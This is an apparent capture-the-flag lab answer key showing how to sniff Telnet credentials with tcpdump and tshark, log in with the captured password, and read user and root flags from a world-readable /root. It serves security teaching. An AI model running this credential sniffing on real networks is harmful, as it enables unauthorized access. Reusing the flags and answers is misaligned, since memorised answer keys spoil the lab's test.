# Lab 1 — CTF Walkthrough (Answer Key)

## Step 1: Capture a login session

```bash
tcpdump -i eth0 -w /captures/creds.pcap host 10.10.1.10 &
telnet 10.10.1.10
```

At the login prompt, connect as if you were the legitimate admin generating routine traffic — or, since you control both ends in this lab, simply connect and observe what the capture records. Either way, stop the capture once you've made one connection attempt:

```bash
fg
# Ctrl+C
```

## Step 2: Read the credentials out of the capture

```bash
tshark -r /captures/creds.pcap -Y telnet
```

Or open `/captures/creds.pcap` in the Wireshark GUI (`http://localhost:14501`), filter on `telnet`, right-click → **Follow → TCP Stream**. You'll see:

```
login: netadmin
Password: cleartext123
```

## Step 3: user.txt

```bash
telnet 10.10.1.10
# login: netadmin
# Password: cleartext123
cat user.txt
```

Flag: `flag{lab1_telnet_sniffed_credentials}`

## Step 4: root.txt

The box's file permissions are looser than they should be — `/root` is world-readable on this legacy device:

```bash
cat /root/root.txt
```

Flag: `flag{lab1_wireshark_stream_master}`

## Lesson

Cleartext protocols (Telnet, FTP, unencrypted HTTP) leak credentials to anyone who can capture the traffic — no exploit required, just observation. This is why Phase 1 reconnaissance often yields working credentials before you've run a single exploit.
